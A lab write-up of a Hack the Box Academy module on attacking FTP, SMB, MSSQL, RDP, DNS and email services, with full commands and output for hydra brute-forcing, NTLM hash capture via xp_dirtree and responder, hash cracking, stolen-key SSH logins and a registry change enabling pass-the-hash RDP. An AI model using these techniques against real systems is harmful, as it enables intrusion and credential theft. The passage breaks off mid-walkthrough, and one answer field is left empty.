# Attacking Common Services
* Source: [Hack the Box: Academy](https://academy.hackthebox.com/)
* Module: Attacking Common Services
* Tier: II
* Difficulty: Medium
* Category: Offensive
* Time estimate: 8 hours
* Date: DD-MM-YYYY
* Author: [DjikstraCS](https://github.com/DjikstraCS)

---
## Attacking FTP
### Question 1:
![](./attachments/Pasted%20image%2020221114140322.png)

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -n -sC -sV 10.129.97.86        
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-14 08:17 EST
Stats: 0:02:15 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 80.00% done; ETC: 08:20 (0:00:34 remaining)
Stats: 0:02:26 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 80.00% done; ETC: 08:20 (0:00:36 remaining)
Nmap scan report for 10.129.97.86
Host is up (0.044s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE      VERSION
22/tcp   open  ssh          OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7108b0c4f3ca9757649770f9fec50c7b (RSA)
|   256 45c3b51463993d9eb32251e59776e150 (ECDSA)
|_  256 2ec2416646efb68195d5aa3523945538 (ED25519)
53/tcp   open  domain       ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
139/tcp  open  netbios-ssn  Samba smbd 4.6.2
445/tcp  open  netbios-ssn  Samba smbd 4.6.2
2121/tcp open  ccproxy-ftp?
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (InlaneFTP) [10.129.97.86]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port2121-TCP:V=7.93%I=7%D=11/14%Time=6372400B%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,8B,"220\x20ProFTPD\x20Server\x20\(InlaneFTP\)\x20\[10\.129\
SF:.97\.86\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20crea
SF:tive\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20creative\
SF:r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: -1s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: ATTCSVC-LINUX, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb2-time: 
|   date: 2022-11-14T13:20:34
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 177.76 seconds
```

**Answer:** `2121`

### Question 2:
![](./attachments/Pasted%20image%2020221114140352.png)

```
┌──(kali㉿kali)-[~]
└─$ ftp -p 10.129.106.151 2121
Connected to 10.129.106.151.
220 ProFTPD Server (InlaneFTP) [10.129.106.151]
Name (10.129.106.151:kali): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls /
229 Entering Extended Passive Mode (|||60189|)
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 ftp      ftp          1959 Apr 19  2022 passwords.list
-rw-rw-r--   1 ftp      ftp            72 Apr 19  2022 users.list
226 Transfer complete
ftp> cat users.list
?Invalid command.
ftp> get users.list
local: users.list remote: users.list
229 Entering Extended Passive Mode (|||39757|)
150 Opening BINARY mode data connection for users.list (72 bytes)
    72        1.49 MiB/s 
226 Transfer complete
72 bytes received in 00:00 (0.73 KiB/s)
ftp> 
zsh: suspended  ftp -p 10.129.106.151 2121
  
┌──(kali㉿kali)-[~]
└─$ cat users.list                                                                         
root
robin
adm
admin
administrator
MARRY
jason
sa
dbuser
pentest
marlin
```

**Answer:** `robin`

### Question 3:
![](./attachments/Pasted%20image%2020221114140400.png)

```
┌──(kali㉿kali)-[~]
└─$ hydra -l robin -P passwords.list ftp://10.129.106.151 -s 2121
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-15 06:14:06
[DATA] max 16 tasks per 1 server, overall 16 tasks, 250 login tries (l:1/p:250), ~16 tries per task
[DATA] attacking ftp://10.129.106.151:2121/
[2121][ftp] host: 10.129.106.151   login: robin   password: 7iz4rnckjsduza7
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-15 06:14:52
```

SSH user:pass `robin:7iz4rnckjsduza7`

```
┌──(kali㉿kali)-[~]
└─$ sudo ssh robin@10.129.95.45
The authenticity of host '10.129.95.45 (10.129.95.45)' can't be established.
ED25519 key fingerprint is SHA256:HfXWue9Dnk+UvRXP6ytrRnXKIRSijm058/zFrj/1LvY.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.95.45' (ED25519) to the list of known hosts.
robin@10.129.95.45's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 15 Nov 2022 11:21:42 AM UTC

  System load:  0.33               Processes:               261
  Usage of /:   28.4% of 13.72GB   Users logged in:         0
  Memory usage: 13%                IPv4 address for ens160: 10.129.95.45
  Swap usage:   0%

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

1 update can be applied immediately.
1 of these updates is a standard security update.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

$ ls
flag.txt
$ cat flag.txt
HTB{ATT4CK1NG_F7P_53RV1C3}
```

**Answer:** `HTB{ATT4CK1NG_F7P_53RV1C3}`

---
## Attacking SMB
### Question 1:
![](./attachments/Pasted%20image%2020221115131350.png)

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap 10.129.95.51 -sV -sC -p139,445                 
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-15 07:10 EST
Nmap scan report for 10.129.95.51
Host is up (0.042s latency).

PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2

Host script results:
|_nbstat: NetBIOS name: ATTCSVC-LINUX, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb2-time: 
|   date: 2022-11-15T12:11:04
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.66 seconds

┌──(kali㉿kali)-[~]
└─$ smbmap -H 10.129.95.51
[+] IP: 10.129.95.51:445        Name: 10.129.95.51                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        GGJ                                                     READ ONLY       Priv
        IPC$                                                    NO ACCESS       IPC Service (attcsvc-linux Samba)
```

**Answer:** `GGJ`

### Question 2:
![](./attachments/Pasted%20image%2020221115131357.png)
*Hint: A colleague has shared with us a password list that we can find in the resource. He was able to compile this during his research.*

```
┌──(kali㉿kali)-[~/HTB/AttackingCommonServices]
└─$ crackmapexec smb 10.129.203.6 -u 'jason' -p pws.list --local-auth                
SMB         10.129.203.6    445    ATTCSVC-LINUX    [*] Windows 6.1 Build 0 (name:ATTCSVC-LINUX) (domain:ATTCSVC-LINUX) (signing:False) (SMBv1:False)
SMB         10.129.203.6    445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:liverpool STATUS_LOGON_FAILURE 
(...) 
SMB         10.129.203.6    445    ATTCSVC-LINUX    [+] ATTCSVC-LINUX\jason:34c8zuNBo91!@28Bszh
```

**Answer:** `34c8zuNBo91!@28Bszh`

### Question 3:
![](./attachments/Pasted%20image%2020221115131404.png)

Now access the share.

```
┌──(kali㉿kali)-[~/HTB/AttackingCommonServices]
└─$ smbclient \\\\10.129.203.6\\GGJ -U jason                         
Password for [WORKGROUP\jason]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Apr 19 17:33:55 2022
  ..                                  D        0  Mon Apr 18 13:08:30 2022
  id_rsa                              N     3381  Tue Apr 19 17:33:04 2022

                14384136 blocks of size 1024. 10088060 blocks available
smb: \> get id_rsa

┌──(kali㉿kali)-[~/HTB/AttackingCommonServices]
└─$ ls
id_rsa

┌──(kali㉿kali)-[~/HTB/AttackingCommonServices]
└─$ chmod 600 id_rsa                                                 

┌──(kali㉿kali)-[~/HTB/AttackingCommonServices]
└─$ ssh jason@10.129.203.6 -i id_rsa
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 14 Feb 2023 11:54:33 AM UTC

  System load:  0.0                Processes:               235
  Usage of /:   25.4% of 13.72GB   Users logged in:         0
  Memory usage: 15%                IPv4 address for ens160: 10.129.203.6
  Swap usage:   0%

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

0 updates can be applied immediately.


Last login: Tue Apr 19 21:50:46 2022 from 10.10.14.20
$ ls
flag.txt
$ cat flag.txt
HTB{SMB_4TT4CKS_2349872359}
```

Now login wih ssh.

**Answer:** `HTB{SMB_4TT4CKS_2349872359}`

---
## Attacking SQL Databases
### Question 1:
![](./attachments/Pasted%20image%2020230214195638.png)

First setup responder as a listener.

```
┌──(kali㉿kali)-[~]
└─$ sudo responder -I tun0
[sudo] password for kali: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0
(...)

[+] Listening for events...   
```

Then steal the user hash with `XP_DIRTREE`.

```
┌──(kali㉿kali)-[~/HTB/AttackingCommonServices]
└─$ sqsh -S 10.129.189.3 -U htbdbuser -P 'MSSQLAccess01!' -h
sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
2> go
```

And back in the responder terminal.

```
[+] Listening for events...                                                                                                                                       

[SMB] NTLMv2-SSP Client   : 10.129.189.3
[SMB] NTLMv2-SSP Username : WIN-02\mssqlsvc
[SMB] NTLMv2-SSP Hash     : mssqlsvc::WIN-02:31c03bd7eae96a3c:A2A330DF7CD39ED780E2F6286F4ED211:010100000000000000DD38047F40D9013A397EDC4AA20499000000000200080054004B005600490001001E00570049004E002D005300590050004D00430047004C00540034004100340004003400570049004E002D005300590050004D00430047004C0054003400410034002E0054004B00560049002E004C004F00430041004C000300140054004B00560049002E004C004F00430041004C000500140054004B00560049002E004C004F00430041004C000700080000DD38047F40D90106000400020000000800300030000000000000000000000000300000C371AA8751A30CD8B5369FD0A430B55401834653CC6D6FC9F2FA16DBEB1A23630A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E003100330037000000000000000000
```

We got the has, now we can crack it with `john`.

```
┌──(kali㉿kali)-[~/HTB/AttackingCommonServices]
└─$ john --wordlist=~/HTB/PasswordAttacks/PasswordMutations/mut_password.list NTLM.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
princess1        (mssqlsvc)     
1g 0:00:00:00 DONE (2023-02-14 14:41) 14.28g/s 1024Kp/s 1024Kc/s 1024KC/s Poohbear94..P@ssword109
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

user:pass `mssqlsvc:princess1`

**Answer:** `princess1`

### Question 2:
![](./attachments/Pasted%20image%2020230214195648.png)

Since the `mssqlsvc` is a local windows user we need to put `.\\` before the username when we login. Then use the `MSSQL` syntax to dump the database.

```
┌──(kali㉿kali)-[~/HTB/AttackingCommonServices]
└─$ sqsh -S 10.129.189.3 -U .\\mssqlsvc -P 'princess1' -h
sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
1> SELECT name FROM master.dbo.sysdatabases
2> go

        master                                                                                                                                                       

        tempdb                                                                                                                                                    

        model                                                                                                                                                     

        msdb                                                                                                                                                      

        hmaildb                                                                                                                                                   

        flagDB                                                                                                                                                    
  
1> USE flagDB
2> go
1> SELECT table_name FROM flagDB.INFORMATION_SCHEMA.TABLES
2> go

        tb_flag                                                                                                                                                   
  
1> SELECT * FROM tb_flag
2> go

        HTB{!_l0v3_#4$#!n9_4nd_r3$p0nd3r}
```

**Answer:** `HTB{!_l0v3_#4$#!n9_4nd_r3$p0nd3r}`

---
## Attacking RDP
### Question 1:
![](./attachments/Pasted%20image%2020230215192850.png)

Login with RDP and look at the desktop.

![](./attachments/Pasted%20image%2020230215193024.png)

**Answer:** `pentest-notes.txt`

### Question 2:
![](./attachments/Pasted%20image%2020230215192858.png)
*Hint: Restricted Admin Mode is disabled by default*

Answer is given in the section text.

![](./attachments/https://academy.hackthebox.com/storage/modules/116/rdp_session-5.png)

**Answer:** `DisableRestrictedAdmin`

### Question 3:
![](./attachments/Pasted%20image%2020230215192906.png)
*Hint: There is an alternate method of connecting to RDP other than username and password.*

First enable RDP on the `Administrator` account by enabling `Restricted Admin Mode`.

```
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\htb-rdp>reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
The operation completed successfully.
```

To login we need a hash or password. In the `pentest-notes.txt` file we found a hash for the `Administrator` account. Let's use it to login.

Success! The flag is on the desktop.

![](./attachments/Pasted%20image%2020230215193745.png)

**Answer:** `HTB{RDP_P4$$_Th3_H4$#}`

---
## Attacking DNS
### Question:
![](./attachments/Pasted%20image%2020230215200335.png)
*Hint: We highly recommend to use the tool called "subbrute" for this. This tool can be found on Github.*

Download `subbrute` from [GitHub](https://github.com/CiscoCXSecurity/enum4linux)

Insert the IP of the box into the `./resolver.txt` file and run the script.

```
┌──(kali㉿kali)-[~/HTB/AttackingCommonServices/subbrute]
└─$ echo "10.129.190.114" > ./resolvers.txt

┌──(kali㉿kali)-[~/HTB/AttackingCommonServices/subbrute]
└─$ python3 subbrute.py inlanefreight.htb -s ./names.txt -r ./resolvers.txt
Warning: Fewer than 16 resolvers per process, consider adding more nameservers to resolvers.txt.
inlanefreight.htb
hr.inlanefreight.htb
```

Then do a zone transfer.

```
┌──(kali㉿kali)-[~]
└─$ dig axfr hr.inlanefreight.htb @10.129.190.114

; <<>> DiG 9.18.11-2-Debian <<>> axfr hr.inlanefreight.htb @10.129.190.114
;; global options: +cmd
hr.inlanefreight.htb.   604800  IN      SOA     inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
hr.inlanefreight.htb.   604800  IN      TXT     "HTB{LUIHNFAS2871SJK1259991}"
hr.inlanefreight.htb.   604800  IN      NS      ns.inlanefreight.htb.
ns.hr.inlanefreight.htb. 604800 IN      A       127.0.0.1
hr.inlanefreight.htb.   604800  IN      SOA     inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
;; Query time: 55 msec
;; SERVER: 10.129.190.114#53(10.129.190.114) (TCP)
;; WHEN: Wed Feb 15 14:27:11 EST 2023
;; XFR size: 5 records (messages 1, bytes 230)
```

**Answer:** `HTB{LUIHNFAS2871SJK1259991}`

---
## Attacking Email Services
### Question 1:
![](./attachments/Pasted%20image%2020230215212119.png)

Use the script `smtp-user-enum` to enumerate SMTP users.

```
┌──(kali㉿kali)-[~/HTB/AttackingCommonServices]
└─$ smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.203.12
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... RCPT
Worker Processes ......... 5
Usernames file ........... users.list
Target count ............. 1
Username count ........... 79
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ inlanefreight.htb

######## Scan started at Thu Feb 16 07:09:53 2023 #########
10.129.203.12: marlin@inlanefreight.htb exists
######## Scan completed at Thu Feb 16 07:10:00 2023 #########
1 results.

79 queries in 7 seconds (11.3 queries / sec)
```

**Answer:** `marlin`

### Question 2:
![](./attachments/Pasted%20image%2020230215212130.png)

```
┌──(kali㉿kali)-[~/HTB/AttackingCommonServices]
└─$ hydra -l marlin@inlanefreight.htb -P pws.list -f 10.129.203.12 imap 
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-02-16 07:41:47
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 333 login tries (l:1/p:333), ~21 tries per task
[DATA] attacking imap://10.129.203.12:143/
[143][imap] host: 10.129.203.12   login: marlin@inlanefreight.htb   password: poohbear
[STATUS] attack finished for 10.129.203.12 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-02-16 07:42:04
```

user:pass `marlin@inlanefreight.htb:poohbear`

Now we can login with telnet on port 143 using the `IMAP` syntax.

```
┌──(kali㉿kali)-[~/HTB/AttackingCommonServices]
└─$ telnet 10.129.203.12 143
Trying 10.129.203.12...
Connected to 10.129.203.12.
Escape character is '^]'.
* OK IMAPrev1
1 login marlin poohbear
1 NO Invalid user name or password. Please use full email address as user name.
1 login marlin@inlanefreight.htb poohbear
1 OK LOGIN completed
1 list "" *
* LIST (\HasNoChildren) "." "INBOX"
1 OK LIST completed
1 SELECT "INBOX"
* 1 EXISTS
* 1 RECENT
* FLAGS (\Deleted \Seen \Draft \Answered \Flagged)
* OK [UIDVALIDITY 1650465305] current uidvalidity
* OK [UIDNEXT 2] next uid
* OK [PERMANENTFLAGS (\Deleted \Seen \Draft \Answered \Flagged)] limited
1 OK [READ-WRITE] SELECT completed
1 fetch 1:* all
* 1 FETCH (RFC822.SIZE 601 FLAGS (\Seen) INTERNALDATE "20-Apr-2022 14:49:32 -0600" ENVELOPE ("Wed, 20 Apr 2022 15:49:11 -0400" "Password change" (("marlin" NIL "marlin" "inlanefreight.htb")) (("marlin" NIL "marlin" "inlanefreight.htb")) (("marlin" NIL "marlin" "inlanefreight.htb")) (("administrator@inlanefreight.htb" NIL "administrator" "inlanefreight.htb")) (("marlin@inlanefreight.htb" NIL "marlin" "inlanefreight.htb")) NIL NIL "<85cb72668d8f5f8436d36f085e0167ee78cf0638.camel@inlanefreight.htb>"))
1 OK FETCH completed
1 fetch 1 RFC822
* 1 FETCH (RFC822 {640}
Return-Path: marlin@inlanefreight.htb
Received: from [10.10.14.33] (Unknown [10.10.14.33])
        by WINSRV02 with ESMTPA
        ; Wed, 20 Apr 2022 14:49:32 -0500
Message-ID: <85cb72668d8f5f8436d36f085e0167ee78cf0638.camel@inlanefreight.htb>
Subject: Password change
From: marlin <marlin@inlanefreight.htb>
To: administrator@inlanefreight.htb
Cc: marlin@inlanefreight.htb
Date: Wed, 20 Apr 2022 15:49:11 -0400
Content-Type: text/plain; charset="UTF-8"
User-Agent: Evolution 3.38.3-1 
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit

Hi admin,

How can I change my password to something more secure? 

flag: HTB{w34k_p4$$w0rd}


)
1 OK FETCH completed
```

**Answer:** ``

---
## Attacking Common Services - Easy
### Question:
![](./attachments/Pasted%20image%2020230215212204.png)

```
┌──(kali㉿kali)-[~/HTB/AttackingCommonServices/o365spray]
└─$ sudo nmap -n -sV -sC 10.129.203.7                                     
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-16 13:23 EST
Nmap scan report for 10.129.203.7
Host is up (0.075s latency).
Not shown: 993 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
|     Command unknown, not supported or not allowed...
|     Command unknown, not supported or not allowed...
|   Help: 
|     220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
|     214-The following commands are implemented
|     USER PASS ACCT QUIT PORT RETR
|     STOR DELE RNFR PWD CWD CDUP
|     NOOP TYPE MODE STRU
|     LIST NLST HELP FEAT UTF8 PASV
|     MDTM REST PBSZ PROT OPTS CCC
|     XCRC SIZE MFMT CLNT ABORT
|     HELP command successful
|   NULL: 
|_    220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
|_ssl-date: 2023-02-16T18:25:33+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=Test/organizationName=Testing/stateOrProvinceName=FL/countryName=US
| Not valid before: 2022-04-21T19:27:17
|_Not valid after:  2032-04-18T19:27:17
25/tcp   open  smtp          hMailServer smtpd
| smtp-commands: WIN-EASY, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp   open  http          Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/7.4.29)
| http-title: Welcome to XAMPP
|_Requested resource was http://10.129.203.7/dashboard/
|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
443/tcp  open  ssl/https
|_ssl-date: 2023-02-16T18:25:33+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=Test/organizationName=Testing/stateOrProvinceName=FL/countryName=US
| Not valid before: 2022-04-21T19:27:17
|_Not valid after:  2032-04-18T19:27:17
|_http-server-header: Core FTP HTTPS Server
587/tcp  open  smtp          hMailServer smtpd
| smtp-commands: WIN-EASY, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
3306/tcp open  mysql         MySQL 5.5.5-10.4.24-MariaDB
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.4.24-MariaDB
|   Thread ID: 10
|   Capabilities flags: 63486
|   Some Capabilities: ODBCClient, Support41Auth, Speaks41ProtocolOld, LongColumnFlag, SupportsCompression, DontAllowDatabaseTableColumn, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, SupportsTransactions, Speaks41ProtocolNew, FoundRows, InteractiveClient, SupportsLoadDataLocal, IgnoreSigpipes, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: Q(p!MBBeUY@rB._tL[fn
|_  Auth Plugin Name: mysql_native_password
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: WIN-EASY
|   NetBIOS_Domain_Name: WIN-EASY
|   NetBIOS_Computer_Name: WIN-EASY
|   DNS_Domain_Name: WIN-EASY
|   DNS_Computer_Name: WIN-EASY
|   Product_Version: 10.0.17763
|_  System_Time: 2023-02-16T18:25:14+00:00
|_ssl-date: 2023-02-16T18:25:32+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=WIN-EASY
| Not valid before: 2023-02-15T18:22:30
|_Not valid after:  2023-08-17T18:22:30
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.93%I=7%D=2/16%Time=63EE74C5%P=x86_64-pc-linux-gnu%r(NULL
SF:,41,"220\x20Core\x20FTP\x20Server\x20Version\x202\.0,\x20build\x20725,\
SF:x2064-bit\x20Unregistered\r\n")%r(GenericLines,AD,"220\x20Core\x20FTP\x
SF:20Server\x20Version\x202\.0,\x20build\x20725,\x2064-bit\x20Unregistered
SF:\r\n502\x20Command\x20unknown,\x20not\x20supported\x20or\x20not\x20allo
SF:wed\.\.\.\r\n502\x20Command\x20unknown,\x20not\x20supported\x20or\x20no
SF:t\x20allowed\.\.\.\r\n")%r(Help,17B,"220\x20Core\x20FTP\x20Server\x20Ve
SF:rsion\x202\.0,\x20build\x20725,\x2064-bit\x20Unregistered\r\n214-The\x2
SF:0following\x20commands\x20are\x20implemented\r\n\x20\x20\x20\x20\x20USE
SF:R\x20\x20PASS\x20\x20ACCT\x20\x20QUIT\x20\x20PORT\x20\x20RETR\r\n\x20\x
SF:20\x20\x20\x20STOR\x20\x20DELE\x20\x20RNFR\x20\x20PWD\x20\x20\x20CWD\x2
SF:0\x20\x20CDUP\r\n\x20\x20\x20\x20\x20MKD\x20\x20\x20RMD\x20\x20\x20NOOP
SF:\x20\x20TYPE\x20\x20MODE\x20\x20STRU\r\n\x20\x20\x20\x20\x20LIST\x20\x2
SF:0NLST\x20\x20HELP\x20\x20FEAT\x20\x20UTF8\x20\x20PASV\r\n\x20\x20\x20\x
SF:20\x20MDTM\x20\x20REST\x20\x20PBSZ\x20\x20PROT\x20\x20OPTS\x20\x20CCC\r
SF:\n\x20\x20\x20\x20\x20XCRC\x20\x20SIZE\x20\x20MFMT\x20\x20CLNT\x20\x20A
SF:BORT\r\n214\x20\x20HELP\x20command\x20successful\r\n");
Service Info: Host: WIN-EASY; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 104.80 seconds
```

Running `smtp-user-enum` to find users.

```
┌──(kali㉿kali)-[~/HTB/AttackingCommonServices]
└─$ smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.203.7 
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... RCPT
Worker Processes ......... 5
Usernames file ........... users.list
Target count ............. 1
Username count ........... 79
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ inlanefreight.htb

######## Scan started at Thu Feb 16 13:32:02 2023 #########
10.129.203.7: fiona@inlanefreight.htb exists
######## Scan completed at Thu Feb 16 13:32:08 2023 #########
1 results.

79 queries in 6 seconds (13.2 queries / sec)

```

Using hydra to brute force the password.

```
┌──(kali㉿kali)-[~/HTB/AttackingCommonServices]
└─$ hydra -l fiona@inlanefreight.htb -P ~/HTB/PasswordAttacks/PasswordMutations/mut_password.list -f 10.129.203.7 smtp
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-02-16 14:05:45
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 94044 login tries (l:1/p:94044), ~5878 tries per task
[DATA] attacking smtp://10.129.203.7:25/
[STATUS] 1722.00 tries/min, 1722 tries in 00:01h, 92322 to do in 00:54h, 16 active
[25][smtp] host: 10.129.203.7   login: fiona@inlanefreight.htb   password: 987654321
[STATUS] attack finished for 10.129.203.7 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-02-16 14:07:48
```

User:pass `fiona@inlanefreight.htb:987654321`

Logging in to SMTP via telnet failed. 

But FTP worked.

```
┌──(kali㉿kali)-[~/HTB/AttackingCommonServices]
└─$ ftp 10.129.203.7  
Connected to 10.129.203.7.
220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
Name (10.129.203.7:kali): fiona
331 password required for fiona
Password: 
230-Logged on
230 
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||42668|)
ftp: Can't connect to `10.129.203.7:42668': Connection timed out
200 PORT command successful
150 Opening ASCII mode data connection
-r-xr-xrwx   1 owner    group              55 Apr 21  2022      docs.txt
-r-xr-xrwx   1 owner    group             255 Apr 22  2022      WebServersInfo.txt
226 Transfer Complete
ftp> get docs.txt
local: docs.txt remote: docs.txt
200 PORT command successful
150 RETR command started
    55      735.76 KiB/s 
226 Transfer Complete
55 bytes received in 00:00 (314.09 KiB/s)
ftp> get WebServersInfo.txt
local: WebServersInfo.txt remote: WebServersInfo.txt
200 PORT command successful
150 RETR command started
   255        3.38 KiB/s 
226 Transfer Complete
255 bytes received in 00:00 (2.27 KiB/s)
```

Two files where present.

```
┌──(kali㉿kali)-[~/HTB/AttackingCommonServices]
└─$ cat docs.txt                                        
I'm testing the FTP using HTTPS, everything looks good.                                                                                                                                                                  
